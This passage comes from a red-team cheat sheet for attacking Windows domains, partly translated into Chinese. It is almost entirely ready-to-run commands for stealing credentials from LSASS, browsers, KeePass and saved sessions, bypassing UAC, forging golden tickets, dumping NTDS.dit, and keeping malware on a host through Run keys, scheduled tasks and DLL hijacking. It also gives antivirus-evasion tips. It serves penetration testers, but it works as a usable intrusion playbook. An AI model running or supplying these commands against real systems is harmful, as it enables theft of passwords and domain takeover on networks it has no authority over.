class="line">privlege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">The safer method is to dump the process memory of LSASS.exe with MiniDump </span><br><span class="line">(https://github.com/3xpl01tc0d3r/Minidump)</span><br><span class="line"></span><br><span class="line">(or) https://github.com/GhostPack/SharpDump</span><br><span class="line"></span><br><span class="line">and send the .bin to Mimikatz locally.</span><br><span class="line"></span><br><span class="line">sekurlsa::minidump C:\users\m0chan\lssas.dmp</span><br><span class="line"></span><br><span class="line">Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.</span><br><span class="line"></span><br><span class="line">Mimikatz Guide</span><br><span class="line"></span><br><span class="line">#Logon Sessions</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords all</span><br><span class="line"></span><br><span class="line">#Dump Cache</span><br><span class="line"></span><br><span class="line">lsadump::cache</span><br><span class="line"></span><br><span class="line">#Dump SAM</span><br><span class="line"></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h2 id="5-6-Dump-Creds-2"><a href="#5-6-Dump-Creds-2" class="headerlink" title="5.6 Dump Creds #2"></a>5.6 Dump Creds #2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/AlessandroZ/LaZagne</span><br><span class="line"></span><br><span class="line">laZagne.exe all</span><br><span class="line">laZagne.exe browsers</span><br><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure><h2 id="5-7-SessionGopher"><a href="#5-7-SessionGopher" class="headerlink" title="5.7 SessionGopher"></a>5.7 SessionGopher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Arvanaghi/SessionGopher</span><br><span class="line"></span><br><span class="line">Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP</span><br><span class="line"></span><br><span class="line">SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals</span><br><span class="line"></span><br><span class="line">Invoke-SessionGopher -Thorough</span><br><span class="line"></span><br><span class="line">Import-Module path\to\SessionGopher.ps1;</span><br><span class="line">Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</span><br></pre></td></tr></table></figure><h2 id="5-8-Dump-Chrome密码（也发布漏洞利用程序）"><a href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）" class="headerlink" title="5.8 Dump Chrome密码（也发布漏洞利用程序）"></a>5.8 Dump Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="5-9-Dump-Process-Memory-w-Mimikittenz"><a href="#5-9-Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="5.9 Dump Process Memory w/ Mimikittenz"></a>5.9 Dump Process Memory w/ Mimikittenz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/putterpanda/mimikittenz</span><br><span class="line"></span><br><span class="line">mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</span><br><span class="line"></span><br><span class="line">The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.</span><br><span class="line"></span><br><span class="line">Invoke-Mimikittenz</span><br></pre></td></tr></table></figure><h2 id="5-10-Dump-KeePass"><a href="#5-10-Dump-KeePass" class="headerlink" title="5.10 Dump KeePass"></a>5.10 Dump KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="5-11-pypykatz"><a href="#5-11-pypykatz" class="headerlink" title="5.11 pypykatz"></a>5.11 pypykatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/pypykatz</span><br><span class="line"></span><br><span class="line">Full python implementation of Mimikatz :D </span><br><span class="line"></span><br><span class="line">pip3 install pypykatz</span><br></pre></td></tr></table></figure><h2 id="5-12-SafetyKatz"><a href="#5-12-SafetyKatz" class="headerlink" title="5.12 SafetyKatz"></a>5.12 SafetyKatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SafetyKatz</span><br><span class="line"></span><br><span class="line">Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D </span><br><span class="line"></span><br><span class="line">&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.</span><br><span class="line"></span><br><span class="line">First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</span><br></pre></td></tr></table></figure><h2 id="5-13-SharpDPAPI"><a href="#5-13-SharpDPAPI" class="headerlink" title="5.13 SharpDPAPI"></a>5.13 SharpDPAPI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpDPAPI</span><br><span class="line"></span><br><span class="line">Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</span><br></pre></td></tr></table></figure><h2 id="5-14-SharpSniper"><a href="#5-14-SharpSniper" class="headerlink" title="5.14 SharpSniper"></a>5.14 SharpSniper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HunnicCyber/SharpSniper</span><br><span class="line"></span><br><span class="line">Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.</span><br><span class="line"></span><br><span class="line">SharpSniper is a simple tool to find the IP address of these users so that you can target their box.</span><br><span class="line"></span><br><span class="line">C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123</span><br><span class="line"></span><br><span class="line">User: emusk - IP Address: 192.168.37.130</span><br></pre></td></tr></table></figure><h2 id="5-15-SharpLocker"><a href="#5-15-SharpLocker" class="headerlink" title="5.15 SharpLocker"></a>5.15 SharpLocker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Pickfordmatt/SharpLocker</span><br><span class="line"></span><br><span class="line">SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</span><br></pre></td></tr></table></figure><h2 id="5-16-Check-for-Missing-KB’s"><a href="#5-16-Check-for-Missing-KB’s" class="headerlink" title="5.16 Check for Missing KB’s"></a>5.16 Check for Missing KB’s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watson.exe</span><br><span class="line">Sherlock.ps1</span><br><span class="line"></span><br><span class="line">Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. </span><br><span class="line"></span><br><span class="line">More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)</span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Watson</span><br></pre></td></tr></table></figure><h2 id="5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><a href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件" class="headerlink" title="5.17 如果管理员/系统，则使用Mimikatz解密EFS文件"></a>5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><span class="line"></span><br><span class="line">cipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.</span><br><span class="line"></span><br><span class="line">privilege::debug </span><br><span class="line">token::elevate </span><br><span class="line">crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><span class="line"></span><br><span class="line">dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b</span><br><span class="line"></span><br><span class="line">openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem</span><br><span class="line"></span><br><span class="line">openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class="line"></span><br><span class="line">certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure><h2 id="5-18-UAC绕过"><a href="#5-18-UAC绕过" class="headerlink" title="5.18 UAC绕过"></a>5.18 UAC绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info </span><br><span class="line"></span><br><span class="line">findstr /C:&quot;&lt;autoElevate&gt;true&quot; </span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesRemote.exe</span><br></pre></td></tr></table></figure><h2 id="5-19-Golden-Ticket-Attack"><a href="#5-19-Golden-Ticket-Attack" class="headerlink" title="5.19 Golden Ticket Attack"></a>5.19 Golden Ticket Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line"># To generate the TGT with NTLM</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 128 key</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># Inject TGT with Mimikatz</span><br><span class="line">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Inject Ticket with Rebeus</span><br><span class="line">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</span><br></pre></td></tr></table></figure><h2 id="5-20-子域将危害森林"><a href="#5-20-子域将危害森林" class="headerlink" title="5.20 子域将危害森林"></a>5.20 子域将危害森林</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC</span><br><span class="line"></span><br><span class="line">Tree = Set of domains using same name space (DNS Name)</span><br><span class="line"></span><br><span class="line">Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.</span><br><span class="line"></span><br><span class="line">Forest = Largest Structure composed of all trees.</span><br><span class="line"></span><br><span class="line">Most trees are linked with dual sided trust relationships to allow for sharing of resources.</span><br><span class="line"></span><br><span class="line">By default the first domain created if the Forest Root.</span><br><span class="line"></span><br><span class="line">Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create </span><br><span class="line"></span><br><span class="line">Covert-NameToSid target.domain.com\krbtgt</span><br><span class="line">S-1-5-21-2941561648-383941485-1389968811-502</span><br><span class="line"></span><br><span class="line">Replace 502 with 519 to represent Enterprise Admins</span><br><span class="line"></span><br><span class="line">Create golden ticket and attack parent domain. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This will not work if there is SID Filtering in place for respective target domain.</span><br><span class="line"></span><br><span class="line">harmj0ys article explains it best. </span><br><span class="line"></span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></pre></td></tr></table></figure><h2 id="5-21-Dump-NTDS-dit"><a href="#5-21-Dump-NTDS-dit" class="headerlink" title="5.21 Dump NTDS.dit"></a>5.21 Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\vssadmin create shadow /for=C:</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM</span><br><span class="line">.</span><br><span class="line">reg SAVE HKLM\SYSTEM c:\SYS</span><br><span class="line">vssadmin delete shadows /for= [/oldest | /all | /shadow=]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</span><br></pre></td></tr></table></figure><h2 id="5-22-SeBackupPrivlege-Dump-NTDS-dit"><a href="#5-22-SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="5.22 SeBackupPrivlege - Dump NTDS.dit"></a>5.22 SeBackupPrivlege - Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is disabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Set-SeBackupPrivilege</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite</span><br><span class="line">Copied 12582912 bytes</span><br><span class="line"></span><br><span class="line">Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit </span><br><span class="line"></span><br><span class="line">Remember and not use C:\Windows\ntds\ntds.dit</span><br><span class="line"></span><br><span class="line">reg.exe save hklm\system c:\m0chan\SYSTEM.bak</span><br></pre></td></tr></table></figure><h1 id="0x06-权限维持"><a href="#0x06-权限维持" class="headerlink" title="0x06 权限维持"></a>0x06 权限维持</h1><h2 id="6-1-SSH-Shuttle"><a href="#6-1-SSH-Shuttle" class="headerlink" title="6.1 SSH Shuttle"></a>6.1 SSH Shuttle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</span><br></pre></td></tr></table></figure><h2 id="6-2-SharPersist"><a href="#6-2-SharPersist" class="headerlink" title="6.2 SharPersist"></a>6.2 SharPersist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/fireeye/SharPersist</span><br><span class="line"></span><br><span class="line">C# Libary Designed by FireEye to aid with Persistance using various techniques such as </span><br><span class="line"></span><br><span class="line">KeePass Backdoor</span><br><span class="line">Reg Key</span><br><span class="line">Sch Task Backdoor</span><br><span class="line">Startup Folder (Link File)</span><br><span class="line">Service Backdoor</span><br><span class="line"></span><br><span class="line">See there github linked above for full Syntax, very cool work</span><br></pre></td></tr></table></figure><h2 id="6-3-SharpDoor"><a href="#6-3-SharpDoor" class="headerlink" title="6.3 SharpDoor"></a>6.3 SharpDoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/SharpDoor.git</span><br><span class="line"></span><br><span class="line">SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.</span><br><span class="line"></span><br><span class="line">execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</span><br></pre></td></tr></table></figure><h2 id="6-4-自动运行注册表"><a href="#6-4-自动运行注册表" class="headerlink" title="6.4 自动运行注册表"></a>6.4 自动运行注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br></pre></td></tr></table></figure><h2 id="6-5-Run-amp-Run-Once"><a href="#6-5-Run-amp-Run-Once" class="headerlink" title="6.5 Run &amp; Run Once"></a>6.5 Run &amp; Run Once</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate</span><br><span class="line">/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-6-计划任务"><a href="#6-6-计划任务" class="headerlink" title="6.6 计划任务"></a>6.6 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.</span><br><span class="line"></span><br><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe</span><br><span class="line"></span><br><span class="line">This will run Malware.exe every minute forever.</span><br><span class="line"></span><br><span class="line"># Run Malware.exe every day at 06:00am</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00</span><br><span class="line"></span><br><span class="line"># Runs a task each time the user&apos;s session is idle for 5 minutes.</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5</span><br><span class="line"></span><br><span class="line"># Runs a a task as SYSTEM when User Logs in.</span><br><span class="line">schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</span><br></pre></td></tr></table></figure><h2 id="6-7-Windows启动文件夹"><a href="#6-7-Windows启动文件夹" class="headerlink" title="6.7 Windows启动文件夹"></a>6.7 Windows启动文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This has been around for years as basically every version of Windows contains a startup folder. </span><br><span class="line"></span><br><span class="line">Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line"></span><br><span class="line">Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="6-8-EXE-DLL劫持"><a href="#6-8-EXE-DLL劫持" class="headerlink" title="6.8 EXE / DLL劫持"></a>6.8 EXE / DLL劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.</span><br><span class="line"></span><br><span class="line">Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution.</span><br></pre></td></tr></table></figure><h2 id="6-9-添加用户帐号"><a href="#6-9-添加用户帐号" class="headerlink" title="6.9 添加用户帐号"></a>6.9 添加用户帐号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 